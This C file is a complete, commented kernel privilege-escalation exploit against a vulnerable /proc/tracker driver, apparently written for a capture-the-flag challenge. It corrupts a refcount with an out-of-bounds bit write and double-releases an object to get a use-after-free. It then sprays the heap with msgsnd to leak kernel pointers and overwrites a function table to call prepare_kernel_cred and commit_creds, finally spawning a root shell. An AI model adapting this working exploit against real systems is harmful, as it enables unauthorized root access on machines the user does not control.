#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>

#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ioctl.h>

#define GET_GAME 0x1337
#define SET_NOTES 0x1338
#define RELEASE_GAME 0x1339
#define EXE_GAME 0x133a
#define MARK_ALIVE 0x133b
#define MARK_DEAD 0x133c
#define GET_STATUS 0x133d

#define MAX_GAMES 5

#define BUFF_SIZE 110

/*
 * those are offsets from clock_t_to_jiffies
 */
#define PREPARE_KERNEL_CRED_OFFSET 0x50ad0 
#define COMMIT_CREDS_OFFSET 0x50d70 

struct {
	long mtype;
	char mtext[BUFF_SIZE];
} msg;

typedef struct {
    char buf[135];
    uint32_t serial;
    long gamenum;
    long args;
    long contestant;
} request_t;

/*
 * structure used to leak from game_t
 * first 25 bytes are not important as
 * they are last 25 bytes of description
 */
typedef struct __attribute__((packed)) {
    char padding1[25];
    long state_ptr;
    long ops_ptr;
    long list_head;
    long list_next;
} leak_t;

typedef struct __attribute__((packed)) {
    unsigned long (*execute_game1) (unsigned long); // = dummy
    unsigned long (*execute_game2) (unsigned long); // = clock_t_to_jiffies
    unsigned long (*execute_game3) (unsigned long); // ...
    unsigned long (*execute_game4) (unsigned long);
    unsigned long (*execute_game5) (unsigned long);
    unsigned long (*execute_game6) (unsigned long);
    unsigned long (*fallthrough_game) (unsigned long);
} gameops_t;

/*
 * get statuses of all contestants from beginning to size
 */
void get_all_status(int fd, uint32_t serial, char* out, int size) {
    int status;
    memset(out, 0, size);

    for (int i = 0; i < (size<<3); ++i) {
        status = get_status(fd, serial, i); 
        if (status) {
            out[i>>3] |= 1 << (i&7);
        } else {
            out[i>>3] &= ~(1 << (i&7));
        }
    }
}

/*
 * write statuses of contestants from beginning to len
 * content will be address passed as an argument
 */
void write_statuses(int fd, uint32_t serial, uint64_t address, int len) {
    long status;
    char* data = (char*)&address;

    for (int i = 0; i < (len<<3); ++i) {
        status = (data[i>>3] & (1 << (i&7))) >> (i&7);
        if (status) {
            mark_alive(fd, serial, i);
        } else {
            mark_dead(fd, serial, i);
        }
    }
}

/*
 * override state_t pointer with given address
 */
void write_address(int fd, uint32_t serial, uint64_t address) {
    /*
     * first 25 << 3 contestants are skipped
     * because those are the last 25 bytes of description
     * and we want to override state_ptr which
     * is after description in game_t structure
     */
    int offset = 25 << 3;
    long status;
    long contestant;

    /*
     * state_t structure consists of 135 bytes of notes
     * and then 57 bytes of contestants
     * if we want to write/read specific address we must
     * take it into consideration and subtract 135 from the
     * target address
     */
    address -= 135;
    char* data = (char*)&address;

    for (int i=0; i<64; ++i) {
        contestant = i + offset;
        status = (data[i>>3] & (1 << (i&7))) >> (i&7);

        if (status) {
            mark_alive(fd, serial, contestant);
        } else {
            mark_dead(fd, serial, contestant);
        }
    }
}

/*
 * helper functions to communicate with /proc/tracker using ioctl
 */
int set_notes(int fd, uint32_t serial, const char* note) {
    int result;
    request_t request = {
        .buf="",
        .serial=serial,
        .gamenum=0,
        .args=0,
        .contestant=0
    };
    strncpy(request.buf, note, sizeof(request.buf));
    result = ioctl(fd, SET_NOTES, &request);
    printf("[SET_NOTES] result: %d\n", result);
    return result;
}

uint32_t get_game(int fd, char* gname) {
    int result;
    request_t request = {
        .buf="",
        .serial=0,
        .gamenum=0,
        .args=0,
        .contestant=0
    };
    strncpy(request.buf, gname, sizeof(request.buf));
    result = (uint32_t)ioctl(fd, GET_GAME, &request);
    printf("[GET_GAME] result: %d, 0x%x\n", result, result);
    return result;
}

int release_game(int fd, uint32_t serial) {
    int result;
    request_t request = {
        .buf="",
        .serial=serial,
        .gamenum=0,
        .args=0,
        .contestant=0
    };
    result = ioctl(fd, RELEASE_GAME, &request);
    printf("[RELEASE_GAME] result: %d, 0x%x\n", result, result);
    return result;
}


long exe_game(int fd, uint32_t serial, long gamenum, long args) {
    long result;
    request_t request = {
        .buf="",
        .serial=serial,
        .gamenum=gamenum,
        .args=args,
        .contestant=0
    };
    result = ioctl(fd, EXE_GAME, &request);
    printf("[EXE_GAME] result: %ld, 0x%lx\n", result, result);
    return result;
}

int mark_alive(int fd, uint32_t serial, long contestant) {
    int result;
    request_t request = {
        .buf="",
        .serial=serial,
        .gamenum=0,
        .args=0,
        .contestant=contestant
    };
    result = ioctl(fd, MARK_ALIVE, &request);
    /*printf("[MARK_ALIVE] result: %d, 0x%x\n", result, result);*/
    return result;
}

int mark_dead(int fd, uint32_t serial, long contestant) {
    int result;
    request_t request = {
        .buf="",
        .serial=serial,
        .gamenum=0,
        .args=0,
        .contestant=contestant
    };
    result = ioctl(fd, MARK_DEAD, &request);
    /*printf("[MARK_DEAD] result: %d, 0x%x\n", result, result);*/
    return result;
}

int get_status(int fd, uint32_t serial, long contestant) {
    int result;
    request_t request = {
        .buf="",
        .serial=serial,
        .gamenum=0,
        .args=0,
        .contestant=contestant
    };
    result = ioctl(fd, GET_STATUS, &request);
    // printf("[GET_STATUS] status: %d, 0x%x, contestat #%ld\n", result, result, contestant);
    return result;
}
/*
 * end of helper functions
 */

int main(void) {
    /*
     * here we are opening /proc/tracker and getting file descriptor
     * in order to communicate with it using ioctl()
     */
    int fd;
    fd = open("/proc/tracker", 2);
    int result;
    if (fd < 0) {
        printf("Error opening proc...\n");
        return 0;
    }

    int serial0 = get_game(fd, "first");
    int serial1 = get_game(fd, "second");
    int serial2 = get_game(fd, "second");
    int serial3 = get_game(fd, "second");

    /* heap
     * game_t (first), refcount=1, state_ptr=state_t (first)
     * state_t (first)
     * game_t (second), refcount=3, state_ptr=state_t (second)
     * state_t (second)
     */

    /*
     * here we are abusing OOB write which let's us override
     * 1 bit after state_t structure
     * in our case we are overriding first bit of game_t (second) structure
     * which is also a first bit of refcount (current value is 0b11)
     * 
     * overriding first bit with 0 (mark_dead) makes refcount decrement from 0b11 (3) to 0b10 (2)
     */
    result = mark_dead(fd, serial0, 456);
    /*
     * abuse incorrect value in refcount by releasing game twice
     * which will cause game_t (second) and it's state_t (second) to be freed
     * with us having serial1 value which gives as access to game_t (second)
     */
    result = release_game(fd, serial2);
    result = release_game(fd, serial3);

    /* heap
     * game_t (first), refcount=1, state_ptr=state_t (first)
     * state_t (first)
     * game_t (second), freed
     * state_t (second) freed
     */

    /*
     * we want to keep state_ptr in game_t (second) but also
     * to make kernel to allocate game_t (third) in place of state_t (second)
     * if we manage to do so we will be able to read pointers from game_t (third)
     * because game_t (second) will point at game_t (third) and treat it as
     * it's state_t (second)
     *
     * in order to do so we will use kernel heap spray technique
     * which uses msgsnd function to make kernel allocate memory on the heap
     */

    memset(msg.mtext, 0x42, BUFF_SIZE-1);
    msg.mtext[BUFF_SIZE] = 0;
    msg.mtype = 1;
    int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    msgsnd(msqid, &msg, sizeof(msg.mtext), 0);

    int serial4 = get_game(fd, "third");

    /* heap
     * game_t (first), refcount=1, state_ptr=state_t (first)
     * state_t (first)
     * game_t (second), data allocated from msgsnd() call, state_ptr=game_t (third)
     * game_t (third), refcount=1, state_ptr=state_t (third)
     * state_t (third)
     */

    /*
     * we can now read statuses of contestants of game_t (second) which in fact
     * will be pointers from game_t (third)
     */
    leak_t leak;
    get_all_status(fd, serial1, (char*)&leak, 57);
    printf("state_t = %lx\n", leak.state_ptr);
    printf("gameops_t = %lx\n", leak.ops_ptr);
    printf("list_head = %lx\n", leak.list_head);
    printf("list_next = %lx\n", leak.list_next);

    /*
     * we were able to read statuses of contestants but
     * we are also able to write them
     *
     * we will override the state_ptr of game_t (third) with
     * pointer to gameops_t and we will be able to read
     * pointers to functions stored in there
     */
    uint64_t address = leak.ops_ptr;
    write_address(fd, serial1, address);
    gameops_t gameops;
    get_all_status(fd, serial4, (char*)&gameops, 24);
    printf("clock: %lx\n", gameops.execute_game2);

    /*
     * now, having address of clock_t_to_jiffies
     * we can calculate addresses of:
     * - prepare_kernel_cred
     * - commit_creds
     * functions and override gameops_t structure pointers
     * and then call the function using (exe_game)
     */
    long clock = gameops.execute_game2;
    long prepare_kernel_cred = clock - PREPARE_KERNEL_CRED_OFFSET;
    long commit_creds = clock - COMMIT_CREDS_OFFSET;
    write_statuses(fd, serial4, prepare_kernel_cred, 8);

    long struct_creds = exe_game(fd, serial4, 1, 0);
    long actual_struct_creds = 
        (leak.state_ptr & 0xFFFFFFFF00000000 | struct_creds & 0xFFFFFFFF);

    printf("got creds struct pointer: %lx\n", actual_struct_creds);
    write_statuses(fd, serial4, commit_creds, 8);
    result = exe_game(fd, serial4, 1, actual_struct_creds);

    system("/bin/sh");
    close(fd);
    return 0;
}
